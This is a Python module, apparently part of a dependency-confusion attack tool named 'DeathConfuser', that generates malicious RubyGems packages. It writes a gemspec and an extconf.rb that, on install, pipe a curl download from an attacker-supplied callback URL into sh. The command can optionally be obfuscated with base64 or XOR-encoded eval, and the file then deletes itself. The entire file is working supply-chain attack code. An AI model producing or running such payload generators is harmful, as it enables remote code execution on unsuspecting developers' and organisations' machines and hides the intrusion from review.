"""RubyGems payload generator with optional obfuscation."""
from __future__ import annotations

import base64
import random
from textwrap import dedent
from typing import Optional

from payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def _xor(data: str, key: int) -> str:
    return "".join(chr(ord(c) ^ key) for c in data)


def _encode(script: str, method: Optional[str]) -> str:
    if method == "b64":
        enc = base64.b64encode(script.encode()).decode()
        return f"eval(Base64.decode64('{enc}'))"
    if method == "xor":
        key = random.randint(1, 255)
        enc = ",".join(str(ord(c) ^ key) for c in script)
        return f"eval([{enc}].map{{|c|(c^{key}).chr}}.join)"
    return script


def generate(gem: str, callback: str, encode: Optional[str] = None, self_destruct: bool = True) -> str:
    """Return gemspec and extconf payload executing ``callback``."""

    cmd = f"system('curl -fsSL {callback} | sh')"
    exec_line = _encode(cmd, encode)
    extconf = dedent(
        f"""
        require 'mkmf'
        {exec_line}
        {'File.delete(__FILE__)' if self_destruct else ''}
        """
    ).strip()

    gemspec = builder.render(
        "ruby_gemspec.j2",
        package_name=gem,
        version="0.0.1",
        description="DeathConfuser payload",
    )

    return gemspec + "\n# ext/extconf.rb\n" + extconf
